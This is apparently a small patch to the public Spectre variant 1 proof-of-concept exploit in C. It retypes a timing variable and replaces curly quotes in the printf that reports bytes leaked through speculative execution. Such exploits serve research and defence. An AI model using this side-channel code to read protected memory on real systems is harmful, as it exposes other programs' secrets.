@@ -36,7 +36,8 @@ Analysis code
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
-  int tries, i, j, k, mix_i, junk = 0;
+  int tries, i, j, k, mix_i;
+  unsigned int junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t *addr;
@@ -114,8 +115,8 @@ int main(int argc, const char **argv) {
     printf("Reading at malicious_x = %p... ", (void*)malicious_x);
     readMemoryByte(malicious_x++, value, score);
     printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d    ", value[0],
-            (value[0] > 31 && value[0] < 127 ? value[0] : ’?’), score[0]);
+    printf("0x%02X='%c' score=%d    ", value[0],
+            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     if (score[1] > 0)
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
